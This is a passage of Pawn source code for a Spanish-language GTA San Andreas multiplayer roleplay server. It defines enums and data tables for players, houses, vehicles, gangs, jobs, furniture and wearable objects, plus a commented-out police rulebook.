	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 288
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 289
	{0.066092, -0.004346, -0.000952, 1.162765, 0.000000, 354.893707, 1.004458, 1.004458, 1.234344 }, // Hair3 - 290
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 291
	{0.074633, 0.006723, -0.000952, 1.162765, 0.000000, 354.744812, 1.004458, 1.004458, 1.020303 }, // Hair3 - 292
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 293
	{0.091338, 0.011203, -0.000952, 1.162765, 0.000000, 7.673956, 1.004458, 1.004458, 1.129834 }, // Hair3 - 294
	{0.077449, 0.006221, 0.002460, 1.162765, 0.000000, 355.039520, 1.004458, 1.004458, 1.108941 }, // Hair3 - 295
	{0.069757, -0.014896, 0.002460, 1.162765, 0.000000, 339.120452, 1.004458, 1.004458, 1.179332 }, // Hair3 - 296
	{0.086319, -0.014856, 0.002460, 1.162765, 0.000000, 357.547332, 1.004458, 1.004458, 1.285995 }, // Hair3 - 297
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 298
	{0.091403, 0.024850, 0.002460, 1.162765, 0.000000, 357.547332, 1.004458, 1.004458, 1.193961 } // Hair3 - 299
};

static const Float: EntregaLadron[][] =
{
	{735.35, -1804.15, 13.12},
	{345.3384, -1315.2172, 15.5893},
	{701.3901, -1200.0107, 17.8875},
	{1302.2891, -1246.0732, 13.9886},
	{1289.7131, -1175.4156, 25.2246}
};

static const ColoresGZ[] =
{
	0xC8C3C381,// GRIS (SIN FAMILIA)
 	0x00CF0081,// FAMILIA 1: GROVE (VERDE)
 	0xAF00AF81,// FAMILIA 2: BALLAS (MORADO)
 	0x0000FF81 // FAMILIA 3: SUREÑOS (AZUL)
};

// ---====[ Ayuntamiento restringido ]====---- //

new
	restriccion1,
	restriccion2,
	restriccion3,
	restriccion4,
	restriccion5,
	restriccion6,
	restriccion7,
	restriccion8,
	restriccion9;

// ---====[ Enums ]====---- //

enum InfoJ
{
	jClave,
	jPreguntaS[MAX_CARACTERES_PS],
	jRespuestaS,
	bool:jRegistrado,
 	jSexo,
	jEdad,
	jPelea,
	jEstilo,
	jDNI,
	Float:jVida,
	Float:jChaleco,
	jRopa[MAX_ROPA],
	jDinero,
	jNivel,
 	Float:jExperiencia,
	Float:jHambre,
	Float:jCansancio,
	Float:jOrina,
 	Float:jPosX,
 	Float:jPosY,
 	Float:jPosZ,
 	jInterior,
 	jVirtualWorld,
	jAdmin,
	jLider,
	jMiembro,
	jRango,
	jVehiculo,
	jEncarcelado,
	jTiempoCarcel,
	jMinutos,
	jHoras,
	jLiderFam,
	jMiembroFam,
	jRangoFam,
	jTrabajo,
	jNivelTrabajo,
	jEntregas,
	jSaldo,
	jIDCuentaB,
	jNumeroCel,
	bool:jBuscadorVeh,
	jArmas[13],
	jBalas[13],
	jObjeto[MAX_OBJS],
	bool:jLicenciaAuto,
	bool:jLicenciaMoto,
	bool:jLicenciaArmas,
	jCosechas,
	jAccesorio[7],
	jAttachModel[10],
	jAttachBone[10],
	bool:jAttachOcultado[7],
	jContacto[10],
	jEstrellas,
	bool:jEncendedor,
	bool:jBomba,
	jCigarrillos,
	jRepartidas,
	jBarridas,
	jAcento,
	bool:jSoga,
	bool:jVenda,
	bool:jBaneado,
	bool:jMuerto,
	bool:jBlockDudas,
	bool:jBlockFam,
	bool:jBlockFac,
	jTiempoDudas,
	jIbu400,
	jIbu600,
	jSeda,
	jDroga[MAX_DROGAS],
	jMineral[MAX_MINERALES],
	jMineralF[MAX_MINERALES],
	jFasos,
	jDrogado,
	jDutyS,//hora duty start
	jDutyF,//hora duty finish
	jAdv,
	jAdmAdv,
	Float:jAttachPosx[10],
	Float:jAttachPosy[10],
	Float:jAttachPosz[10],
	Float:jAttachAngx[10],
	Float:jAttachAngy[10],
	Float:jAttachAngz[10],
	Float:jAttachEscx[10],
	Float:jAttachEscy[10],
	Float:jAttachEscz[10]
};

enum nInfo
{
	nNombre[MAX_CARACTERES_NAME],
	nComprador[MAX_PLAYER_NAME],
	nContra,
	Float:nEntrada_x,
	Float:nEntrada_y,
	Float:nEntrada_z,
	Float:nSalida_x,
	Float:nSalida_y,
	Float:nSalida_z,
	nDinero,
	nVW,
	nInt,
	nPrecio,
	bool:nComprado,
	bool:nCerrado,
	nPrecioEntrada,
	nTipo,
	nIcono
}

enum cInfo
{
	cNombre[MAX_CARACTERES_NAME],
	cComprador[MAX_PLAYER_NAME],
	cContra,
	Float:cEntrada_x,
	Float:cEntrada_y,
	Float:cEntrada_z,
	Float:cSalida_x,
	Float:cSalida_y,
	Float:cSalida_z,
	cDinero,
	cVW,
	cInt,
	cPrecio,
	bool:cComprada,
	bool:cCerrada,
	cFamilia,
	cArmas[10],
	cBalas[10],
	cObjModel[MAX_MUEBLES_CASA],
	Float:cObjPosX[MAX_MUEBLES_CASA],
	Float:cObjPosY[MAX_MUEBLES_CASA],
	Float:cObjPosZ[MAX_MUEBLES_CASA],
	Float:cObjRotX[MAX_MUEBLES_CASA],
	Float:cObjRotY[MAX_MUEBLES_CASA],
	Float:cObjRotZ[MAX_MUEBLES_CASA],
	cContra_puerta,
	cDireccion[30]
}

enum E_INTINFO
{
	Float:intEntrada_x,
	Float:intEntrada_y,
	Float:intEntrada_z,
	Float:intEntrada_a,

	Float:intSalida_x,
	Float:intSalida_y,
	Float:intSalida_z,
	Float:intSalida_a,

	intInt,
	intTiempo
}

enum gInfo
{
	gInt,
	gVW,
	gIDCasa,
	Float:gIntV_x,
	Float:gIntV_y,
	Float:gInt_x,
	Float:gInt_y,
	Float:gInt_z,
	Float:gExt_x,
	Float:gExt_y,
	Float:gExt_z,
	Float:gExtV_x,
	Float:gExtV_y,
	Float:gAng,
	bool:gCerrado
}

enum iInfo
{
	Float:iPos_x,
	Float:iPos_y,
	Float:iPos_z,
	iInt,
	iNombre[24]
}

enum E_CONTRATOH
{
	hitPor[MAX_PLAYER_NAME],
	hitDinero,
	hitVictima[MAX_PLAYER_NAME]
}


enum E_CAMILLA
{
	camiObjID,
	camiUsadaPor,
}

enum fInfo
{
	fContra[18],
	fDinero,
	fMiembros,
	fLider[MAX_PLAYER_NAME],
	fRangos
};

enum bancInfo
{
	cuenNombre[MAX_PLAYER_NAME],
	cuenDinero
}

enum famInfo
{
	fNombre[MAX_CARACTERES_NAME],
	fContra[18],
	fDinero,
	Float:fPos_x,
	Float:fPos_y,
	Float:fPos_z,
	fRango_1[18],
	fRango_2[18],
	fRango_3[18],
	fRango_4[18],
	fRango_5[18],
	fNombre_L[18],
	fMiembros,
	fLider[MAX_PLAYER_NAME],
	bool:fPandilla
}

enum CamaraI
{
	CamNombre[20],
	Float:CamPosX,
	Float:CamPosY,
	Float:CamPosZ,
	Float:CamRotX,
	Float:CamRotY,
	Float:CamRotZ,
	CamInt
}

enum ObjetoTInfo
{
	TipoOBJ,
	IntOBJ,
	VWOBJ,
	ArmaOBJ,
	BalasOBJ,
	Float:Posx,
	Float:Posy,
	Float:Posz,
	Float:ArmaduraOBJ,
	TickOBJ
}

enum Vehi
{
	bool:vMotor,
	bool:vLuces,
	bool,vCerrado,
	bool:vAlarma,
	bool:vCapo,
	bool:vBaul,
	vFaccion,
	vTrabajo,
	vRadio
};

enum vInfo
{
	vModelo,
	vColor1,
	vColor2,
	vPrecio,
	vComprador[MAX_PLAYER_NAME],
	Float:vPosX,
	Float:vPosY,
	Float:vPosZ,
	Float:vPosA,
	vPlaca[24],
	vPintadoJ,
	bool:vCerrado,
	bool:vUsado,
	vFamilia,
	vInt,
	vVW,
	Float:vMetros,
	vArma[MAX_ARMAS_VEH],
	vBalas[MAX_ARMAS_VEH]
}

enum InfoPorton_Ex2
{
	portID,
	portModel,
	Float:pX,
	Float:pY,
	Float:pZ,
	Float:pRX,
	Float:pRY,
	Float:pRZ,
	Float:pAX,
	Float:pAY,
	Float:pAZ,
	portFamilia,
	portCasa,
	Float:portVelocidad
};

enum entInfo
{
	Float:ePosx,
	Float:ePosy,
	Float:ePosz,
	NombreEntrega[25]
}

enum camInfo
{
	camCarga,
	camChofer[MAX_PLAYER_NAME]
}

enum rPos
{
	Float:Posx,
	Float:Posy,
	Float:Posz
}

enum gRandPos
{
	Float:PosVx,
	Float:PosVy,
	Float:Posx,
	Float:Posy,
	Float:Posz,
	IntPG
}

enum objInfo
{
	oID,
	oIDModel,
	Float:oPosx,
	Float:oPosy,
	Float:oPosz,
	Float:oAngx,
	Float:oAngy,
	Float:oAngz,
	oNombre[26],
	oTamano,
	oColor,
	oTamanoO,
	oIndexO
}

static const InfoCamara[MAX_CAMARAS][CamaraI] =
{
	{"Banco\n",183.967483,-131.995391,1002.612548,0.000000,0.000000,-75.799972,9},
	{"Centro\n",1542.625732,-1714.364746,27.157493,0.000000,0.000000,67.199989,0},
	{"Grove\n",2229.954833,-1721.087036,18.462814,0.000000,0.000000,54.599998,0},
	{"Grotti\n",582.885864,-1271.972900,37.272178,0.000000,0.000000,43.100006,0},
	{"Unity\n",1788.588378,-1868.551269,27.015766,0.000000,0.000000,-140.499969,0}
};

static const PosCajero[11][rPos] =
{
    {2241.60009766,-1722.69995117,13.199999},
	{2423.39990234,-2111.80004883,12.899999},
	{1774.40002441,-1303.19995117,13.199999},
	{488.00000000,-1269.19995117,15.399999},
	{1539.19995117,-1611.40002441,13.199999},
	{1497.09997559,-1022.20001221,23.5},
	{815.70001221,-1356.50000000,13.0000},
	{193.175598,-127.648681,999.252929},
	{193.171188,-123.799209,999.283020},
	{175.149688,-128.267013,999.263061},
	{175.126678,-124.423271,999.272644}
};

enum E_INFOTV
{
	bool:tvPrendida,
	Float:tvPos[3]
}

enum E_GZ
{
	gzID,
	Float:gzMin[2],
	Float:gzMax[2],
	gzPandilla
}

static const Float:PosMapas[][3] =
{
	{1420.4203,-2278.3896,13.5469},
	{1536.2032,-1684.4418,13.5469},
	{614.5687,-1229.0382,18.4063},
	{1188.0443,-1338.4818,13.5703}
};

static const ComidaRandom[3][entInfo] =
{
	{788.7081,-1607.7781,13.0451,"Burger shot"},
	{1195.3383,-885.7877,42.6999,"Burger shot"},
	{922.6721,-1367.2224,13.387,"Polleria"}
};

static const ProductosVariosRandom[4][entInfo] =
{
	{1358.0088,-1772.7513,13.4734,"24/7"},
	{1330.2429,-895.0700,39.5781,"24/7"},
	{1853.1027,-1863.1195,13.578,"24/7"},
	{1001.3561,-906.2241,42.1897,"24/7"}
};

static const RopaRandom[2][entInfo] =
{
    {459.1196,-1509.3938,30.6371,"Victim"},
    {507.6712,-1370.8846,15.7813,"ProLaps"}
};

static const randHospital[][rPos] =
{
	{2587.3059,1306.0282,867.0212},
	{2587.2881,1311.1232,867.0212},
	{2558.5544,1314.6407,867.0212},
	{2558.8401,1310.6531,867.0212},
	{2587.8645,1298.5059,867.0212},
	{2587.9424,1293.2561,867.0212},
	{2559.3267,1299.7633,867.0212},
	{2558.9158,1305.4246,867.0212},
	{2588.1826,1287.3768,867.0212},
	{2588.7107,1281.6542,867.0212},
	{2559.0352,1299.7488,867.0212},
	{2558.6152,1305.4844,867.0212},
	{2588.3276,1287.4442,867.0212},
	{2588.4207,1281.7206,867.0212},
	{2588.9019,1273.8260,867.0212},
	{2588.7852,1268.9371,867.0212},
	{2560.0823,1275.7120,867.0212},
	{2559.7664,1281.1328,867.0212}
};

static const GunObjectIDs[200] =
{
   1575,  331, 333, 334, 335, 336, 337, 338, 339, 341, 321, 322, 323, 324, 325, 326, 342, 343, 344, -1,  -1 , -1 ,
   346, 347, 348, 349, 350, 351, 352, 353, 355, 356, 372, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367,
   368, 369, 1575
};

static const InfoPGarage[4][gRandPos] =
{
	{424.8867,-95.2384,424.9882,-92.0879,1001.9422,10},//1P
	{424.8867,-95.2384,424.9882,-92.0879,1011.9422,10},//1P (2)
	{1256.3330,-862.0385,1256.1805,-858.8985,1091.2500,12},//2P
	{1249.9900,-861.5973,1249.9752,-858.9730,1091.2571,12}//2P
};

static const Float:PosCosechador[][] =
{
	{-326.4533,-1469.8893,13.8431},
	{-331.1960,-1514.6949,14.6535},
	{-284.6288,-1509.2533,6.8734},
	{-262.7570,-1472.4436,4.3869},
	{-219.3573,-1473.2496,7.2779},
	{-217.9589,-1501.5316,8.4601},
	{-234.3148,-1514.2739,7.0969},
	{-264.8584,-1552.6582,4.0351},
	{-262.3976,-1512.9161,5.6998},
	{-315.7227,-1495.7722,12.0248},
	{-304.0390,-1536.5836,10.8621},
	{-268.0158,-1503.2007,5.3878},
	{-221.9250,-1526.8292,6.9596},
	{-220.2080,-1486.0869,7.4915},
	{-295.6155,-1497.6013,8.9004},
	{-325.9180,-1453.6652,13.7153}
};

static const Float:PosCosechadorLVL2[][] =
{
    {-300.267, -1429.174, 15.148},
	{-245.043, -1392.053, 10.739},
	{-212.731, -1315.665, 9.811},
	{-268.822, -1324.558, 9.906},
	{-322.250, -1355.827, 10.755},
	{-307.621, -1416.630, 15.218},
	{-221.516, -1416.386, 6.442},
	{-192.817, -1369.140, 5.849},
	{-264.128, -1330.401, 9.290},
	{-243.823, -1397.105, 10.598},
	{-175.373, -1344.210, 4.748},
	{-224.988, -1336.357, 11.129},
	{-270.711, -1370.770, 11.254},
	{-318.749, -1416.095, 15.218},
	{-274.162, -1349.828, 8.968},
	{-230.048, -1318.810, 12.394},
	{-195.395, -1369.734, 5.982},
	{-319.871, -1444.497, 14.814}
};

static const Float:PosCosechadorMari[][] =
{
	{-1018.879, -1625.632, 77.358},
	{-989.426, -1620.803, 77.343},
	{-981.567, -1595.859, 77.344},
	{-1002.971, -1588.634, 77.350},
	{-999.472, -1614.842, 77.344},
	{-1025.369, -1612.559, 77.344},
	{-1009.058, -1592.011, 77.351},
	{-981.299, -1593.088, 77.344},
	{-1003.966, -1574.583, 77.349},
	{-1014.876, -1616.694, 77.345},
	{-1017.097, -1660.169, 77.564}
};


static const Float:PosBasura[][3] =
{
    {1302.0740,-1410.4644,13.8715},
    {1430.7965,-1445.9150,14.0172},
    {1691.5344,-1446.3608,14.0297},
    {1900.8783,-1456.1775,13.9998},
    {2117.3596,-1484.6792,24.4293},
    {2190.9351,-1740.3708,13.9809},
    {2277.3118,-1726.7865,14.043},
    {2375.0090,-1646.1002,14.073},
    {2347.7219,-1479.9049,24.426},
    {2375.7944,-1313.9464,24.4681},
    {2508.3242,-1251.8052,35.5125},
    {2678.8428,-1250.5308,54.8444},
    {2742.9285,-1179.7654,69.8663},
    {2618.1057,-1052.8989,70.0425},
    {2122.8655,-1306.2704,24.4595},
    {2244.5713,-1389.5562,24.4875},
    {2201.6318,-1294.7100,24.4733},
    {1804.1807,-1259.0662,14.1225},
    {1519.6307,-1434.9824,14.0123},
    {1154.4668,-1411.4197,14.1224},
    {1015.4563,-1390.2244,13.7558},
    {860.4225,-1410.7246,13.6718},
    {563.5642,-1397.2673,15.3358},
    {441.7430,-1368.5634,26.0865},
    {735.7159,-1088.0411,21.964},
    {802.5876,-1105.3016,24.371},
    {802.8663,-1362.7678,14.0438},
    {1035.6021,-1333.7155,14.046},
    {1129.0830,-1286.3590,14.044},
    {1436.5427,-937.7684,36.7491},
    {2121.6660,-1088.6660,24.8532},
    {2341.7297,-1042.0698,53.5041},
    {2517.7498,-825.6945,90.41}
};

enum AttachmentEnum
{
    attachmodel,
    attachname[21],
    attachprecio
}

static const ObjetosInterior[][] =
{
	{2165, 1500, "PC + Escritorio"}, // 1
	{2356, 100, "Silla de Escritorio"}, // 2
	{2028, 350, "Consola CJD500"}, // 3
	{2779, 600, "Máquina de juegos"}, // 4
	{2030, 750, "Mesa de Marmol"}, // 5
	{2086, 1000, "Mesa de Vidrio"}, // 6
	{2112, 300, "Mesa de madera A"}, // 7
	{2115, 600, "Mesa de madera B"}, // 8
	{2079, 80, "Silla A"}, // 9
	{2120, 150, "Silla B"}, // 10
	{2121, 50, "Silla Roja"}, // 11
	{2096, 100, "Silla Grande"}, // 12
	{2069, 100, "Lampara"}, // 13
	{2103, 800, "Estereo"}, // 14
	{2132, 200, "Fregadera Blanca"}, // 15
	{2141, 900, "Heladera Blanca"}, // 16
	{2149, 600, "Microondas"}, // 17
	{2161, 500, "Estanteria"}, // 18
	{2167, 750, "Armario"}, // 19
	{2202, 1500, "Fotocopiadora"}, // 20
	{2313, 900, "TV + DVD Player"}, // 21
	{2312, 1200, "Television A"}, // 22
	{2316, 1200, "Television B"}, // 23
	{2322, 1200, "Television C"}, // 24
	{2298, 1000, "Cama Azul"}, // 25
	{2299, 1000, "Cama Marron"}, // 26
	{2300, 1000, "Cama Amarilla"}, // 27
	{2301, 1000, "Cama Amarilla-Roja"}, // 28
	{2526, 1250, "Bañera"}, // 29
	{2527, 1200, "Ducha"}, // 30
	{2524, 200, "Lavado"}, // 31
	{2525, 200, "Inodoro"}, // 32
	{1208, 120, "Lavaropa"}, // 33
	{1762, 120, "Sillón A"}, // 34
	{1765, 120, "Sollón B"}, // 35
	{1761, 700, "Sofa A"}, // 36
	{1764, 700, "Sofa B"}, // 37
	{1409, 20, "Tacho de basura"}, // 38
	{2627, 500, "Cinta para correr"}, // 39
	{2630, 480, "Bicicleta Fija"}, // 40
	{2964, 1000, "Mesa de pool"}, // 41
	{1502, 200, "Puerta"}, // 42
	{19317, 600, "Guitarra eléctrica"}, // 43
	{2134, 400, "Cocina blanca Parte 1"}, // 44
	{2133, 400, "Cocina blanca Parte 2"}, // 45
	{2131, 400, "Cocina blanca Parte 3"}, // 46
	{2130, 200, "Fregadera Roja"}, // 47
	{2128, 900, "Heladera Roja"}, // 48
	{2127, 300, "Cocina roja Parte 1"}, // 49
	{2129, 300, "Cocina roja Parte 2"}, // 50
	{2294, 300, "Cocina roja Parte 3"}, // 51
	{19166, 100, "Cuadro de San Andreas"}, // 52
	{19172, 100, "Cuadro de Santa Maria B."}, // 53
	{19173, 100, "Cuadro de San Fierro"}, // 54
	// --------------| ADDED IN v2 |----------------- //
	{1840, 120, "Parlante"}, // 54
	{1839, 230, "Equipo de música"}, // 54
	{1828, 80, "Alfombra Leopardo"}, // 54
	{1817, 60, "Mesa ratona"}, // 54
	{1808, 30, "Bidón de agua"}, // 54
	{1803, 155, "Cama madera"}, // 54
	{1755, 210, "Sofá azul"}, // 54
	{1760, 210, "Sillón azul"}, // 54
	{1753, 210, "Sillón marron"}, // 54
	{1744, 30, "Estante"}, // 54
	{1742, 300, "Mueble+libros"}, // 54
	{1738, 90, "Estufa pared"}, // 54
	{1735, 160, "Sofá floreado"}, // 54
	{1726, 270, "Sillón negro"}, // 54
	{1727, 270, "Sofá negro"}, // 54
	{1724, 270, "Sofá negro madera"}, // 54
	{1723, 270, "Sillón negro madera"}, // 54
	{1717, 150, "Televisor c/pie"}, // 54
	{1705, 270, "Sofá marrón madera"}, // 54
	{1702, 270, "Sillón marrón madera"}, // 54
	{16779, 100, "Ventilador"}, // 54
	{1649, 70, "Vidrio"}, // 54
	// ----------------------------------
	{2135, 500, "Horno + extractor Beige"}, // 55
	{2136, 200, "Fregadera Beige"}, // 56
	{2137, 300, "Cocina Beige Parte 1"}, // 57
	{2139, 300, "Cocina Beige Parte 2"}, // 58
	{2140, 300, "Cocina Beige Parte 3"}, // 59
	{2160, 200, "Fregadera de madera"}, // 60
	{2159, 300, "Cocina madera parte 1"}, // 61
	{2158, 300, "Cocina madera parte 2"}, // 62
	{2157, 300, "Cocina madera parte 3"}, // 63
	{19354, 400, "Pared media negra"}, // 64
	{19355, 400, "Pared media gris"}, // 65
	{19356, 400, "Pared media madera"}, // 66
	{19357, 400, "Pared media blanca"}, // 67
	{19384, 350, "Marco puerta negro"}, // 68
	{19385, 350, "Marco puerta gris"}, // 69
	{19386, 350, "Marco puerta madera"}, // 70
	{19387, 350, "Marco puerta blanco"}, // 71
	{19400, 350, "Marco ventana negro"}, // 72
	{19401, 350, "Marco ventana gris"}, // 73
	{19402, 350, "Marco ventana madera"}, // 74
	{19403, 350, "Marco ventana blanco"}, // 75
	{19427, 280, "Pared chica negra"}, // 76
	{19428, 280, "Pared chica gris"}, // 77
	{19429, 280, "Pared chica madera"}, // 78
	{19430, 280, "Pared chica blanca"}, // 79
	{19446, 280, "Pared grande negra"}, // 80
	{19447, 280, "Pared grande gris"}, // 81
	{19448, 280, "Pared grande madera"}, // 82
	{19449, 280, "Pared grande blanca"} // 83
};

static const AttachmentObjects[][AttachmentEnum] =
{
	{18636, "Gorra (policia)",20},
	{18638, "Casco (minero)",15},
	{18639, "Sombrero",25},
	{18640, "Pelo",40},
	{18975, "Pelo 2",40},
	{19136, "Pelo 3",40},
	{19274, "Pelo 4",40},

	#if defined VERSION_03x

	{19516, "Pelo 5",40},
	{19517, "Pelo 6",40},
	{19518, "Pelo 7",40},
	{19519, "Pelo 8",40},
	{19520, "Sombrero (Piloto)",40},
	{19521, "Sombrero (Policia)",40},

	#endif

	{18641, "Linterna",10},
	{18645, "Casco de moto",30},
	{18891, "Bandana 1",10},
	{18892, "Bandana 2",10},
	{18893, "Bandana 3",10},
	{18894, "Bandana 4",10},
	{18895, "Bandana 5",10},
	{18896, "Bandana 6",10},
	{18897, "Bandana 7",10},
	{18898, "Bandana 8",10},
	{18899, "Bandana 9",10},
	{18900, "Bandana 10",10},
	{18901, "Bandana 11",10},
	{18902, "Bandana 12",10},
	{18903, "Bandana 13",10},
	{18904, "Bandana 14",10},
	{18905, "Bandana 15",10},
	{18906, "Bandana 16",10},
	{18907, "Bandana 17",10},
	{18908, "Bandana 18",10},
	{18909, "Bandana 19",10},
	{18910, "Bandana 20",10},
	{18911, "Bandana 22",10},
	{18912, "Bandana 23",10},
	{18913, "Bandana 24",10},
	{18914, "Bandana 25",10},
	{18915, "Bandana 26",10},
	{18916, "Bandana 27",10},
	{18917, "Bandana 28",10},
	{18918, "Bandana 29",10},
	{18919, "Bandana 30",10},
	{18920, "Bandana 31",10},
	{18921, "Boina",10},
	{18922, "Boina 1",10},
	{18923, "Boina 2",10},
	{18924, "Boina 3",10},
	{18925, "Boina 4",10},
	{18926, "Gorra",10},
	{18927, "Gorra 1",10},
	{18928, "Gorra 2",10},
	{18929, "Gorra 3",10},
	{18930, "Gorra 4",10},
	{18931, "Gorra 5",10},
	{18932, "Gorra 6",10},
	{18933, "Gorra 7",10},
	{18934, "Gorra 8",10},
	{18935, "Gorra 9",10},
	{18936, "Casco",10},
	{18937, "Casco 1",10},
	{18938, "Casco 2",10},
	{18939, "Gorra 10",10},
	{18940, "Gorra 11",10},
	{18941, "Gorra 12",10},
	{18942, "Gorra 13",10},
	{18943, "Gorra 14",10},
	{18944, "Sombrero",30},
	{18945, "Sombrero 1",30},
	{18946, "Sombrero 2",30},
	{18947, "Sombrero 3",30},
	{18948, "Sombrero 4",30},
	{18949, "Sombrero 5",30},
	{18950, "Sombrero 6",30},
	{18951, "Sombrero 7",30},
	{18952, "Casco (boxeo)",30},
	{18953, "Sombrero 8",30},
	{18954, "Sombrero 9",30},
	{18955, "Gorra 15",15},
	{18956, "Gorra 16",15},
	{18957, "Gorra 17",15},
	{18958, "Gorra 18",15},
	{18959, "Gorra 19",15},
	{18960, "Gorra 20",15},
	{18961, "Gorra 21",15},
	{18962, "Sombrero 10",30},
	{18964, "Bufon",15},
	{18965, "Bufon 1",15},
	{18966, "Bufon 2",15},
	{18967, "Gorro",15},
	{18968, "Gorro 1",15},
	{18969, "Gorro 2",15},
	{18970, "Gorro 3",15},
	{18971, "Gorro 4",15},
	{18972, "Gorro 5",15},
	{18973, "Gorro 6",15},
	{18974, "Mascara (Zorro)",60},
	{18976, "Casco (moto)",30},
	{18977, "Casco (moto) 1",30},
	{18978, "Casco (moto) 2",30},
	{18979, "Casco (moto) 3",30},
	{19006, "Lentes",15},
	{19007, "Lentes",15},
	{19008, "Lentes",15},
	{19009, "Lentes",15},
	{19010, "Lentes",15},
	{19011, "Lentes",15},
	{19012, "Lentes",15},
	{19013, "Lentes",15},
	{19014, "Lentes",15},
	{19015, "Lentes",15},
	{19016, "Lentes",15},
	{19017, "Lentes",15},
	{19018, "Lentes",15},
	{19019, "Lentes",15},
	{19020, "Lentes",15},
	{19021, "Lentes",15},
	{19022, "Lentes",15},
	{19023, "Lentes",15},
	{19024, "Lentes",15},
	{19025, "Lentes",15},
	{19026, "Lentes",15},
	{19027, "Lentes",15},
	{19028, "Lentes",15},
	{19029, "Lentes",15},
	{19030, "Lentes",15},
	{19031, "Lentes",15},
	{19032, "Lentes",15},
	{19033, "Lentes",15},
	{19034, "Lentes",15},
	{19035, "Lentes",15},
	{19039, "Reloj",8},
	{19040, "Reloj",8},
	{19041, "Reloj",8},
	{19042, "Reloj",8},
	{19043, "Reloj",8},
	{19044, "Reloj",8},
	{19045, "Reloj",8},
	{19046, "Reloj",8},
	{19047, "Reloj",8},
	{19048, "Reloj",8},
	{19049, "Reloj",8},
	{19050, "Reloj",8},
	{19051, "Reloj",8},
	{19052, "Reloj",8},
	{19053, "Reloj",8},
	{19093, "Gorra blanca",20},
	{19095, "Sombrero",20},
	{19096, "Sombrero",20},
	{19097, "Sombrero",20},
	{19098, "Sombrero",20},
	{19099, "Sombrero (policia)",80},
	{19100, "Sombrero (policia)",80},
	{19101, "Casco (policia)",80},
	{19102, "Casco (policia)",80},
	{19103, "Casco (policia)",80},
	{19104, "Casco (policia)",80},
	{19105, "Casco (policia)",80},
	{19106, "Casco (policia)",80},
	{19107, "Casco (policia)",80},
	{19108, "Casco (policia)",80},
	{19109, "Casco (policia)",80},
	{19110, "Casco (policia)",80},
	{19111, "Casco (policia)",80},
	{19112, "Casco (policia)",80},
	{19113, "Casco",40},
	{19114, "Casco",40},
	{19115, "Casco",40},
	{19116, "Casco",40},
	{19117, "Casco",40},
	{19118, "Casco",40},
	{19119, "Casco",40},
	{19120, "Casco",40},
	{19137, "Sombrero (polleria)",30},
	{19138, "Lentes",30},
	{19139, "Lentes",30},
	{19140, "Lentes",30},
	{19141, "Casco (SWAT)",120},
	{19160, "Sombrero",120},
	{19161, "Gorra (policia)",120},
	{19162, "Gorra (policia)",120},
	{19352, "Galera",120},
	{19487, "Galera",120},
	{19488, "Sombrero",30},
	{19421, "Headphone",110},
	{19422, "Headphone",110},
	{19423, "Headphone",110},
	{19424, "Headphone",110}
};

/*new LibroPolicia[][] =
{
	!"La policía está instituida para proteger a los habitantes del territorio\n\
 	en su libertad y en los derechos que de ésta se derivan, por los medios y\n\
 	con los límites declarados por la Constitución Nacional, en la ley, en las\n\
  	Convenciones y Tratados Internacionales, en el Reglamento de Policía y en \n\
  	los principios universales del derecho.",
	!"La policia compromete la conservación del orden público interno. El orden\n\
	público que protege la policía resulta de la prevención y la eliminación de\n\
	las perturbaciones de la seguridad, de la tranquilidad, de la salubridad y \n\
	la moralidad públicas.",
	"La libertad se define y garantiza en la Constitución en las Convenciones y \n\
	Tratados Internacionales y la regulación de su ejercicio corresponde a la ley a los reglamentos.",
	!"En ningún caso la policía podrá emplear medios incompatibles con los principios humanitarios.",
	!"Las normas y los servicios de policía son medios para prevenir la infracción penal.",
	!"Ninguna actividad de policía puede contrariar a quien ejerza su derecho sino a quien abuse de él.",
	!"Podrá reglamentarse el ejercicio de la libertad en cuanto se desarrolle en lugar público o abierto\n\
	al público o de modo que trascienda de lo privado.",
	!"La constitución nacional otorga a la Policía determinados permisos para actuar.\n\
	Cualquier ruptura de alguna de estas normas, el policía será sentenciado\n\
 	a diversos castigos impuestos por el "#R_LSPD_L".",
	!"La constitucion nacional, otorga los siguientes permisos:\n\
	\t• Utilizar únicamente el arma que brinde el "#R_LSPD_L".\n\
	\t• Utilizar el uniforme impuesto por el "#R_LSPD_L"\n\
	\t• En caso de un sospechoso demorado, se debe obtener el permiso del "#R_LSPD_L"\n\
	\t  para efectuar cualquier acción, que implique la detención, encarcelación del mismo\n\
	\t• Las armas, deben ser utilizadas únicamente en caso de que sea necesaria.",
	!"Cualquier acto efectuado por un policía, que viole los derechos civiles de\n\
	cualquier persona, será gravemente sancionado, dependiendo de la gravedad del caso",
	!"Las llamadas Advertencias policiales, son aplicadas en caso de que un agente\n\
	viole, o rompa las leyes anteriormente mencionadas, el "#R_LSPD_L" aplcará la\n\
	sanción correspondiente, ya sea sumando advertencias, o expulsadolo del cuerpo\n\
	policial.",
	!"A una suma de 4 (cuatro) advertencias, el policía será expulsado.",
	!"Existen códigos de abreviatura, como por ejemplo, el botón ''REF'' en la radio\n\
	para pedir refuerzos. Este, reporta tu ubicación a los demás oficiales, e informa\n\
	que vallan.",
	!"Existen códigos claves para utilizar en los informes, estos son:\n\
	\t• IPP: Invación a propiedad privada.\n\
	\t• VDC: Violación de derechos civiles\n\
	\t• AP: Abuso del poder de un oficial\n\
	\t• PAI: Portación de armas ilegal (Sin licencia)\n\
	\t• SNI: Sujeto no identificado"
};*/


static const AttachmentBones[][] =
{
	{"Columna vertebral"},
	{"Cabeza"},
	{"Brazo izquierdo"},
	{"Brazo derecho"},
	{"Mano izquierda"},
	{"Mano derecha"},
	{"Muslo izquierdo"},
	{"Muslo derecho"},
	{"Pie izquierdo"},
	{"Pie derecho"},
	{"Pantorrilla derecha"},
	{"Pantorrilla izquierda"},
	{"Antebrazo izquierdo"},
	{"Brazo derecho"},
	{"Clavícula izquierda"},
	{"Clavícula derecha"},
	{"Cuello"},
	{"Mandíbula"}
};

